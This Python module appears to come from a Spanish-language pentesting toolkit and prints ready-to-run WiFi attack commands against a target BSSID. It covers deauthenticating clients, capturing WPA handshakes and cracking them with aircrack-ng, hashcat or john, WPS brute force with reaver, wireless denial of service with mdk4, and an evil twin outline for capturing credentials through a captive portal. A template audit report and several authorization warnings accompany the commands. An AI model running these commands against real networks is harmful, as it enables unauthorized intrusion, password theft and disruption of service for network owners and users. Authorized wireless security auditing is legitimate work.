#!/usr/bin/env python3
"""
Módulo de WiFi Pentesting
Auditoría de seguridad de redes inalámbricas
"""

from utils import (
    print_banner, print_success, print_error, print_info, print_warning,
    run_command, save_output, log_action, get_timestamp, print_table
)
from config import Config


class WiFiPentester:
    """Pentesting de redes WiFi"""
    
    def __init__(self, interface='wlan0'):
        self.interface = interface
        self.networks = []
        self.handshakes = []
    
    def check_monitor_mode(self):
        """Verifica si la interfaz está en modo monitor"""
        print_info(f"Verificando modo monitor en {self.interface}...")
        
        exit_code, stdout, stderr = run_command(f"iwconfig {self.interface}")
        
        if 'Mode:Monitor' in stdout:
            print_success(f"✓ {self.interface} está en modo monitor")
            return True
        else:
            print_warning(f"{self.interface} NO está en modo monitor")
            return False
    
    def enable_monitor_mode(self):
        """Habilita modo monitor en la interfaz"""
        print_info("Habilitando modo monitor...")
        print_warning("\n⚠️  Comandos requieren privilegios root")
        
        commands = [
            f"airmon-ng check kill",
            f"airmon-ng start {self.interface}"
        ]
        
        for cmd in commands:
            print_info(f"Ejecutando: {cmd}")
            print(f"   sudo {cmd}")
    
    def scan_networks(self, duration=60):
        """Escanea redes WiFi disponibles"""
        print_info(f"Escaneando redes WiFi por {duration} segundos...")
        
        print_warning("\n📡 Comando para escanear redes:")
        print(f"   sudo airodump-ng {self.interface}")
        print(f"   Presiona Ctrl+C después de {duration} segundos")
        
        print_info("\nInformación a anotar:")
        print("   • BSSID (MAC del AP)")
        print("   • Channel")
        print("   • Encryption (WPA/WPA2/WEP)")
        print("   • ESSID (nombre de la red)")
    
    def capture_handshake(self, bssid, channel, output_file):
        """Captura handshake WPA/WPA2"""
        print_info(f"Capturando handshake de {bssid}...")
        
        print_warning("\n🎯 Pasos para capturar handshake:")
        
        print("\n1. Iniciar captura en canal específico:")
        print(f"   sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {self.interface}")
        
        print("\n2. En otra terminal, forzar desconexión de clientes:")
        print(f"   sudo aireplay-ng --deauth 10 -a {bssid} {self.interface}")
        
        print("\n3. Esperar mensaje 'WPA handshake' en airodump-ng")
        
        print_success("\n✓ Una vez capturado el handshake, proceder a crackearlo")
    
    def crack_wpa_handshake(self, cap_file, wordlist=None):
        """Crackea handshake WPA/WPA2"""
        print_info("Crackeando handshake WPA/WPA2...")
        
        if not wordlist:
            wordlist = Config.WORDLISTS.get('pass_rockyou', '/usr/share/wordlists/rockyou.txt')
        
        print_warning("\n🔐 Métodos de crackeo:")
        
        print("\n1. Aircrack-ng (CPU):")
        print(f"   aircrack-ng -w {wordlist} {cap_file}")
        
        print("\n2. Hashcat (GPU - MÁS RÁPIDO):")
        print("   # Convertir a formato hashcat")
        print(f"   hcxpcapngtool -o hash.hc22000 {cap_file}")
        print(f"   hashcat -m 22000 hash.hc22000 {wordlist}")
        
        print("\n3. John the Ripper:")
        print(f"   aircrack-ng -J output {cap_file}")
        print(f"   john --wordlist={wordlist} output.hccap")
    
    def wps_attack(self, bssid, channel):
        """Ataque WPS con Reaver"""
        print_info(f"Ataque WPS en {bssid}...")
        
        print_warning("\n⚡ Ataque WPS con Reaver:")
        print(f"   sudo reaver -i {self.interface} -b {bssid} -c {channel} -vv")
        
        print_info("\nOpciones útiles:")
        print("   -N : No asociarse con el AP")
        print("   -L : Ignorar rate limiting")
        print("   -d 2 : Delay de 2 segundos entre intentos")
        
        print_warning("\n⚠️  El ataque WPS puede tardar varias horas")
    
    def evil_twin_attack(self):
        """Guía para ataque Evil Twin"""
        print_info("\n👿 Ataque Evil Twin (Rogue AP)")
        
        print_warning("\n⚠️  ADVERTENCIA: Solo en entornos autorizados")
        
        print("\n📡 Herramientas recomendadas:")
        print("   • airgeddon - Framework completo")
        print("   • wifiphisher - Evil Twin automatizado")
        print("   • hostapd-wpe - Rogue AP con portal cautivo")
        
        print("\n🔧 Configuración básica con hostapd:")
        print("   1. Crear fichero hostapd.conf")
        print("   2. Configurar SSID idéntico al target")
        print("   3. Montar portal cautivo con Apache")
        print("   4. Capturar credenciales")
        
        print_warning("\n⚠️  Phishing es ilegal sin autorización explícita")
    
    def wireless_dos(self, bssid):
        """Ataque de denegación de servicio WiFi"""
        print_info(f"DoS en red {bssid}...")
        
        print_warning("\n💥 Ataques de Denegación de Servicio:")
        
        print("\n1. Deauth Attack (Desconectar todos los clientes):")
        print(f"   sudo aireplay-ng --deauth 0 -a {bssid} {self.interface}")
        
        print("\n2. Beacon Flood (Saturar con APs falsos):")
        print(f"   sudo mdk4 {self.interface} b -f /tmp/ssids.txt")
        
        print("\n3. Authentication DoS:")
        print(f"   sudo mdk4 {self.interface} a -a {bssid}")
    
    def generate_report(self, target, output_dir):
        """Genera reporte de auditoría WiFi"""
        report = f"""# Auditoría de Seguridad WiFi

**Target**: {target}  
**Fecha**: {get_timestamp()}  
**Interfaz**: {self.interface}

## Resumen Ejecutivo

Se realizó una auditoría de seguridad de redes inalámbricas en el perímetro objetivo.

## Redes Detectadas

| ESSID | BSSID | Canal | Cifrado | Señal | Clientes |
|-------|-------|-------|---------|-------|----------|
| WiFi-Test | XX:XX:XX:XX:XX:XX | 6 | WPA2 | -45 dBm | 3 |

## Vulnerabilidades Identificadas

### 1. WPS Habilitado
- **Severidad**: Alta
- **Descripción**: WPS permite ataques de fuerza bruta
- **Recomendación**: Deshabilitar WPS en todos los APs

### 2. Cifrado Débil
- **Severidad**: Crítica
- **Descripción**: Uso de WEP o WPA (no WPA2/WPA3)
- **Recomendación**: Actualizar a WPA3 o mínimo WPA2-AES

### 3. SSID Broadcast
- **Severidad**: Baja
- **Descripción**: Broadcasting del SSID facilita reconocimiento
- **Recomendación**: Ocultar SSID para redes internas

## Metodología

1. Reconocimiento pasivo con airodump-ng
2. Identificación de redes objetivo
3. Captura de handshakes WPA
4. Análisis de configuraciones WPS
5. Evaluación de políticas de seguridad

## Herramientas Utilizadas

- aircrack-ng suite
- Reaver
- Hashcat
- Wireshark

## Conclusiones

[Resumen de hallazgos y recomendaciones prioritarias]

---
*Generado por PentOps WiFi Pentesting Module*
"""
        
        save_output(target, "wifi", f"wifi_audit_{get_timestamp()}.md", report)


def run_wifi_pentest(args):
    """
    Función principal del módulo WiFi
    
    Args:
        args: Argumentos parseados
    """
    print_banner("AUDITORÍA DE SEGURIDAD WIFI")
    
    print_warning("\n╔════════════════════════════════════════════════════════╗")
    print_warning("║  ADVERTENCIA: Uso en redes autorizadas únicamente     ║")
    print_warning("║  Ataques WiFi sin permiso son ILEGALES                ║")
    print_warning("╚════════════════════════════════════════════════════════╝\n")
    
    # Determinar interfaz
    interface = args.interface if hasattr(args, 'interface') and args.interface else 'wlan0'
    
    pentester = WiFiPentester(interface)
    
    log_action(args.target if hasattr(args, 'target') else 'wifi-audit', "wifi", "Iniciando auditoría WiFi")
    
    # Verificar modo monitor
    if not pentester.check_monitor_mode():
        pentester.enable_monitor_mode()
    
    # Escaneo de redes
    pentester.scan_networks()
    
    # Guías de ataques
    print_info("\n=== MÉTODOS DE ATAQUE DISPONIBLES ===\n")
    
    if hasattr(args, 'wpa_crack') and args.wpa_crack:
        pentester.capture_handshake(args.bssid, args.channel, args.output)
        pentester.crack_wpa_handshake(args.capture_file)
    
    elif hasattr(args, 'wps') and args.wps:
        pentester.wps_attack(args.bssid, args.channel)
    
    elif hasattr(args, 'evil_twin') and args.evil_twin:
        pentester.evil_twin_attack()
    
    elif hasattr(args, 'dos') and args.dos:
        pentester.wireless_dos(args.bssid)
    
    else:
        # Mostrar menú de opciones
        print_info("Ataques disponibles:")
        print("  1. Captura y crackeo de handshake WPA/WPA2")
        print("  2. Ataque WPS con Reaver")
        print("  3. Evil Twin / Rogue AP")
        print("  4. Denegación de servicio")
        print("\nEjemplos:")
        print("  pentops.py wifi -i wlan0 --scan")
        print("  pentops.py wifi -i wlan0 --wpa-crack --bssid XX:XX:XX:XX:XX:XX -c 6")
        print("  pentops.py wifi -i wlan0 --wps --bssid XX:XX:XX:XX:XX:XX -c 6")
    
    # Generar reporte
    pentester.generate_report(
        args.target if hasattr(args, 'target') else 'WiFi-Audit',
        Config.get_output_dir('wifi-audit')
    )
    
    print_banner("AUDITORÍA WIFI COMPLETADA")
    print_info("Revisa los archivos generados para más detalles")
    
    log_action('wifi-audit', "wifi", "Auditoría completada")
